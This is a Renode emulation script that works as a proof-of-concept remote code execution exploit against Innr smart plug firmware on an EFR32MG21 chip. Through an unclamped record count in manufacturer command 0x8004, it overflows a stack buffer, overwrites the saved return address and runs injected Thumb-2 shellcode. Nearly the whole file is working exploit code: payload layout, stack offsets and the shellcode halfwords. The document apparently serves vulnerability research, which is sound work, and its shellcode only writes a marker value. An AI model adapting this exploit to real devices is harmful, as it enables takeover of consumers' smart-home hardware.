:name: ZB-03 Innr plug — FULL RCE (dispatch-injection -> sink overflow -> shellcode execution)
:description: End-to-end RCE on the real Innr plug EFR32MG21 firmware via mfg cmd 0x8004 (sub_22E06)
#
# ============================ SUCCESS CRITERION ============================
#   After the run: ReadDoubleWord 0x20017000 == 0xC0DE1337 (a value the firmware would NEVER
#   write there) AND PC parked inside the shellcode (0x20006F4C..0x20006F5F) -- reached with
#   NO forced PC after the ONE injection entry at sub_C5F2 (0xC5F2).
#
# ============================ FORCED vs NATURAL ============================
#   FORCED (emulation scaffolding, identical category to zb03_dispatch_inject.resc):
#     * PC is set exactly ONCE, to the ZCL command-dispatch fallthrough sub_C5F2 (0xC5F2),
#       with the r0..r3 + stack-arg contract sub_F8A8 would pass. This bypasses NWK/APS
#       crypto, APS addressing, and the ZCL header parse -- the same "joined device"
#       scaffolding used by every zbNN_dispatch_inject PoC. It proves "a ZCL command that
#       reaches command dispatch is routed to sub_22E06 with attacker params", not the crypto.
#     * The manufacturer-command table row @0x2000F434 is pre-seeded as a REGISTERED handler:
#         entry[0]  @0x2000F434 = 1        (row occupied, !=0)
#         entry[4]  @0x2000F438 = 0x22FED  (registered-handler fn-ptr -> a firmware `bx lr`
#                                           stub @0x22FEC | Thumb; on the real device this is
#                                           the endpoint's registered mfg-command callback,
#                                           which returns to its caller like any handler)
#         entry[8]  @0x2000F43C = 0x0004   (so entry[8]|0x8000 == 0x8004, the matched cmd)
#         entry[10] @0x2000F43E = 0x00     (== a3[0], the table key)
#       On the real device this row is populated at endpoint/cluster registration; seeding it
#       stands in for a registered mfg-command handler. NONE of this is a forced PC.
#     * Lazy-init guard @0x2000FFAA = 1 so the table lookup (sub_23046->sub_22FEE) treats the
#       table as already-initialized and does NOT wipe the pre-seeded row.
#   NATURAL (firmware's OWN execution from sub_C5F2 down -- verified by the marker chain, NO
#   forced PC; the epilogue pop that transfers control to the shellcode is a genuine firmware
#   instruction). Chain proven live by zb03_step0_diag.resc:
#     C5F2 -> C64A(sub_22BD8 ret 0 -> CALL sub_22E06) -> 22E06 entry gate -> 22E5C case-0x8004
#       -> unbounded record loop (count a3[11]=58, UNCLAMPED) writes halfword records via
#          `strh.w r8,[r11,r7,lsl#1]` @0x22ee2 into the stack buffer at SP_f+0x24:
#            records 0..9  = the 10 Thumb-2 shellcode halfwords -> land at 0x20006F4C
#            records 56/57 = saved-LR target 0x20006F4D (shellcode entry | Thumb bit)
#       -> bl sub_22FD2 (0x22f0e) -> bl sub_22DE0 (0x22fc2) -> blx entry[4] handler (returns)
#       -> sub_22E06 epilogue `pop.w {r4,r5,r6,r7,r8,r9,r10,r11,pc}` @0x22fce loads PC from the
#          corrupted saved-LR slot 0x20006FBC == 0x20006F4D -> SHELLCODE RUNS.
#     Shellcode: movw/movt r0=0xC0DE1337; movw/movt r1=0x20017000; str r0,[r1]; b . .
#
# ============================ SP / landing arithmetic ============================
#   Enter sub_C5F2 with SP = 0x20007000.
#     sub_C5F2 prologue push{8}(0x20)+sub sp,#0x20 => SP=0x20006FC0 at `bl sub_22E06`.
#     sub_22E06 entry SP=0x20006FC0; saved LR (last of push{r3..r11,lr}) at SP-4=0x20006FBC.
#     sub_22E06 prologue push{10}(0x28)+sub sp,#0x70 => SP_f=0x20006F28; buffer=SP_f+0x24=0x20006F4C.
#     record sl -> buffer + 2*sl.  record 56 -> buffer+0x70 = 0x20006FBC == saved-LR slot.
#   Shellcode landing = 0x20006F4C ; shellcode entry (Thumb) = 0x20006F4D.
# ===========================================================================

$bin=@scripts/silabs-vuln/zb03_innr.elf
include @scripts/silabs-vuln/boot_mg21.resc
logLevel 3

# COLD observe-only markers (each fires once on this path). No PC is set by any hook.
cpu AddHook 0xc5f2     "self.ErrorLog('MARK_C5F2_DISPATCH')"
cpu AddHook 0xc64a     "self.ErrorLog('MARK_C64A_TO_22E06')"
cpu AddHook 0x22e06    "self.ErrorLog('MARK_22E06_ENTRY')"
cpu AddHook 0x22e5c    "self.ErrorLog('MARK_22E5C_GATE_OK (case-0x8004 body)')"
cpu AddHook 0x22fc2    "self.ErrorLog('MARK_22FC2 -> bl sub_22DE0 (handler dispatch)')"
cpu AddHook 0x22dec    "self.ErrorLog('MARK_22DEC handler returned')"
cpu AddHook 0x22fce    "self.ErrorLog('MARK_22FCE EPILOGUE POP {..,pc} (natural return)')"
cpu AddHook 0x20006f4c "self.ErrorLog('SHELLCODE EXECUTING @0x20006F4C')"

# Boot through clock/power/radio bring-up.
emulation RunFor "0.3"
pause
echo ">>> post-boot PC:"
cpu PC

# --- FORCED registration scaffolding (table row + lazy-init guard) ---------------------
sysbus WriteByte 0x2000FFAA 0x01
sysbus WriteDoubleWord 0x2000F434 0x00000001
sysbus WriteDoubleWord 0x2000F438 0x00022FED
sysbus WriteDoubleWord 0x2000F43C 0x00000004
echo ">>> table row @0x2000F434 (entry[0], entry[4], entry[8..11]) ="
sysbus ReadDoubleWord 0x2000F434
sysbus ReadDoubleWord 0x2000F438
sysbus ReadDoubleWord 0x2000F43C

# --- Craft the PLAINTEXT payload a3 @0x20002000 ----------------------------------------
python "for a in range(0x20002000,0x200020C0,4): monitor.Machine.SystemBus.WriteDoubleWord(a,0)"
# a3[11]=0x3A=58 (UNCLAMPED record count); a3[0]=a3[1]=0 (table key / guard)
sysbus WriteDoubleWord 0x20002008 0x3A000000
# Shellcode halfwords -> records 0..9 -> a3[12+2i]=low, a3[13+2i]=high (halfword = low|high<<8).
# The firmware's own strh loop copies these into the stack buffer @0x20006F4C:
#   f241 3037  movw r0,#0x1337
#   f2cc 00de  movt r0,#0xc0de
#   f247 0100  movw r1,#0x7000
#   f2c2 0101  movt r1,#0x2001
#   6008       str  r0,[r1]
#   e7fe       b .
python "hw=[0xf241,0x3037,0xf2cc,0x00de,0xf247,0x0100,0xf2c2,0x0101,0x6008,0xe7fe]"
python "sb=monitor.Machine.SystemBus"
python "[ (sb.WriteByte(0x20002000+12+2*i, hw[i]&0xff), sb.WriteByte(0x20002000+13+2*i, (hw[i]>>8)&0xff)) for i in range(10) ]"
# saved-LR records 56/57 -> a3[124..127] = 0x20006F4D (shellcode entry | Thumb bit)
sysbus WriteDoubleWord 0x2000207C 0x20006F4D

# --- a2 command struct @0x20002200: a2[0]=0x0000, a2[1](@+2)=0x8004 --------------------
sysbus WriteDoubleWord 0x20002200 0x80040000

# --- sub_C5F2 incoming stack args (arg5=len=13 even parity, arg6=payload) at SP=0x20007000
sysbus WriteDoubleWord 0x20007000 0x0000000D
sysbus WriteDoubleWord 0x20007004 0x20002000

# --- Sentinels ------------------------------------------------------------------------
sysbus WriteDoubleWord 0x20006FBC 0xAABBCCDD
sysbus WriteDoubleWord 0x20017000 0xDEADBEEF
echo ">>> BEFORE: saved-LR slot @0x20006FBC (sentinel) ="
sysbus ReadDoubleWord 0x20006FBC
echo ">>> BEFORE: magic slot @0x20017000 (sentinel 0xDEADBEEF) ="
sysbus ReadDoubleWord 0x20017000

# --- Register contract sub_F8A8 would hand sub_C5F2 (the ONE forced PC) ----------------
sysbus.cpu SetRegister 0  0x00000000
sysbus.cpu SetRegister 1  0x20002200
sysbus.cpu SetRegister 2  0x00000000
sysbus.cpu SetRegister 3  0x00000000
sysbus.cpu SetRegister 13 0x20007000
sysbus.cpu SetRegister 14 0x0000DEAD
sysbus.cpu PC 0xc5f2

# Let the firmware's OWN dispatch carry the frame down, overflow, pop the corrupted LR,
# and run the shellcode (which spins at 0x20006F4C via `b .`, so the window is safe).
emulation RunFor "0.01"
pause

echo ">>> AFTER: PC (expect inside shellcode 0x20006F4C..0x20006F5F) ="
cpu PC
echo ">>> AFTER: saved-LR slot @0x20006FBC (expect 0x20006F4D) ="
sysbus ReadDoubleWord 0x20006FBC
echo ">>> AFTER: magic slot @0x20017000 (expect 0xC0DE1337) ="
sysbus ReadDoubleWord 0x20017000
echo ">>> shellcode bytes copied into stack buffer @0x20006F4C (expect 41 f2 37 30 ...) ="
sysbus ReadDoubleWord 0x20006F4C
quit
